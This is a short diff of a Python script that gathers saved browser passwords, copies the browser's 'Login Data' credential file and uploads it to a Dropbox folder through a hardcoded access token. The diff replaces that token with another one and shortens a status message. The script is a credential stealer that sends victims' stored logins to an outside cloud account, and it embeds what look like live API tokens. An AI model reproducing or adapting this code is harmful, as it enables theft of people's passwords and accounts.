@@ -57,7 +57,7 @@ def send():
 
     jsonData = getpasswords()
     #Get your access code form dropbox to use it here.
-    dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAASvntv3YXXNI6X7NJqbpXtsIQZfw4k6tBHocduKNGn8HD')
+    dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAAS0lJw_bxPINvoAZc2PN041CLRCJHOzm_0fQTy6F6RMiB')
     file_from="c:\prog\Login Data"
     file_to="/kaunheh/Login Data"
     with open(file_from, 'rb') as f:
@@ -71,7 +71,7 @@ def getpath():
 	try: 
 		os.mkdir(target)
 	except:
-		print('file already exists')
+		print('f')
 
 	shutil.copy(source, target)
 	return target
